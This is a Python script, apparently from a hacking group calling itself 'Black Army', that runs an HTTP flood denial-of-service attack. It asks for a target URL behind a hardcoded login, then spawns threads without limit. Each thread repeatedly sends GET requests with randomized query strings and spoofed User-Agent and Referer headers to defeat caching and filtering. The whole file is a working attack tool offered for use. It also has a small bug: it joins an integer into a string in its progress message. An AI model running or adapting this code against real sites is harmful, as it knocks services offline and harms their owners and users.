#!usr/bin/python3.11
import os
import time
import requests
import threading
import datetime
import sys
import random
import string
import colorama

# Colors
class bcolors:

    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    LIGHT_GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    DOUBLE_UNDERLINE = '\033[21m'
    NORMAL_COLOR = '\033[22m'
    NORMAL_INTENSITY = '\033[22m'
    RESET_UNDERLINE = '\033[24m'
    RESET_BLINK = '\033[25m'
    RESET_REVERSE = '\033[27m'
    RESET_HIDDEN = '\033[28m'
    RESET_STRIKETHROUGH = '\033[29m'
    ORANGE = '\033[38;5;214m'  # Light Orange
    PURPLE = '\033[38;5;141m'  # Light Purple
    TEAL = '\033[38;5;37m'     # Teal
    PINK = '\033[38;5;206m'    # Light Pink
    LIME = '\033[38;5;154m'    # Lime Green
    CYAN_BLUE = '\033[38;5;39m'  # Cyan Blue
    DARK_GREEN = '\033[38;5;22m'  # Dark Green
    SKY_BLUE = '\033[38;5;111m'  # Sky Blue
    DARK_ORANGE = '\033[38;5;166m'  # Dark Orange
    INDIGO = '\033[38;5;57m'   # Indigo
    GRAY = '\033[38;5;242m'   
    MAROON = '\033[38;5;52m'   
    OCEAN_BLUE = '\033[38;5;21m'  
    GOLD = '\033[38;5;220m' 
    
if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")

os.system("\033[44mhttps://github.com/abatatsa99\033[0m")
print("\033[7m<<————————————————— MEDAN JUANG BLACK ARMY —————————————————>>\033[0m")
time.sleep(5)
print("Loading.......")

attemps = 0
os.system("clear")   
print("""
\033[31m╔═══════════════════════════════════════════════════════════════════════╗
\033[31m║\033[36m                                                                       \033[31m║
\033[31m║\033[36m    ╔\033[93m█████\033[36m╗╔\033[93m█████\033[36m╗  ╔\033[93m█\033[36m╗╔\033[93m█\033[36m╗    ╔\033[93m█\033[36m╗╔\033[93m██████\033[36m╗ ╔\033[93m███\033[36m╗    ╔\033[93m█\033[36m╗╔\033[93m█████\033[36m╗ ╔\033[93m█\033[36m╗      \033[31m║
\033[31m║\033[36m    ║\033[93m█\033[36m╔═══╝║\033[93m█\033[36m╔══╗\033[93m█\033[36m║ ║\033[93m█\033[36m║║\033[93m█\033[36m║   ║\033[93m█\033[36m║ ║\033[93m█\033[36m╔══╗\033[93m█\033[36m║ ║\033[93m█\033[36m║\033[93m█\033[36m║    ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
\033[31m║\033[36m    ║\033[93m█\033[36m║    ║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║ ║\033[93m█\033[36m║    ║\033[93m█\033[36m║║\033[93m█\033[36m║║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
\033[31m║\033[36m    ║\033[93m█\033[36m║    ║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m║║\033[93m█\033[36m║ ║\033[93m█\033[36m║  ║\033[93m█\033[36m║    ║\033[93m█\033[36m║║\033[93m█\033[36m║ ║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
\033[31m║\033[36m    ║\033[93m█████\033[36m╗║\033[93m█\033[36m║  ║\033[93m█\033[36m║ ║\033[93m█\033[36m║║\033[93m████\033[36m═╝  ║\033[93m█\033[36m║    ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║ ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
\033[31m║\033[36m    ╚═══╗\033[93m█\033[36m║║\033[93m█████\033[36m╗  ║\033[93m█\033[36m║║\033[93m█\033[36m╔══\033[93m█\033[36m╗  ║\033[93m█\033[36m║    ║\033[93m█\033[36m║║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
\033[31m║\033[36m        ║\033[93m█\033[36m║║\033[93m█\033[36m╔══╗\033[93m█\033[36m║ ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║ ║\033[93m████████\033[36m║║\033[93m█\033[36m║    ║\033[93m█\033[36m║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
\033[31m║\033[36m    ║\033[93m█████\033[36m║║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m║║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m╔════╗\033[93m█\033[36m║║\033[93m█\033[36m║    ║\033[93m███\033[36m║║\033[93m█████\033[36m║ ║\033[93m█\033[36m║      \033[31m║
\033[31m║\033[36m    ╚═════╝╚═╝   ╚═╝╚═╝╚═╝   ╚═╝╚═╝    ╚═╝╚═╝    ╚═══╝╚═════╝ ╚═╝      \033[31m║
\033[31m║\033[36m                                                                       \033[31m║
\033[31m╚═══════════════════════════════════════════════════════════════════════╝
""")
while attemps < 100:
    print("\033[104m┌[Black-Army•••")
    username = input("└> Enter your username: \033[32m")
    print("\033[104m┌[Black-Army•••")
    password = input("└> Enter your password: \033[32m")
    print("\033[104m\033[0m")
    if username == 'srk313' and password == 'srk313':
        print("\033[7m•••>       SRIKANDI BLACK ARMY\033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
print("\033[32m┌[Black-Army•••")
url = input("\033[32m└> URL:  \033[0m").strip()
u = int(0)
headers = []
referer = [
    "https://google.it",
    "https://google.com",
    "https://youtube.com",
    ]

def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")

    return headers
		

def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global u
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                u += 1
                print(f"\033[35m[+] \033[94mExecution_target\033[0m \033[41m" +str(url)+ "\033[32mnum_attack" +u+ "")
            except requests.exceptions.ConnectionError:
                print(f"\033[97m[] \033[103mSRIKANDI-313\033[0m  \033[7mConnection-error\033[0m \033[31mServer Maybe down\033[0m")

                pass
            except requests.exceptions.InvalidSchema:
                print ("\033[38;5;154  Request time out")
                raise SystemExit()
            except ValueError:
                print ("\033[38;5;242m  Check Your URL]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()
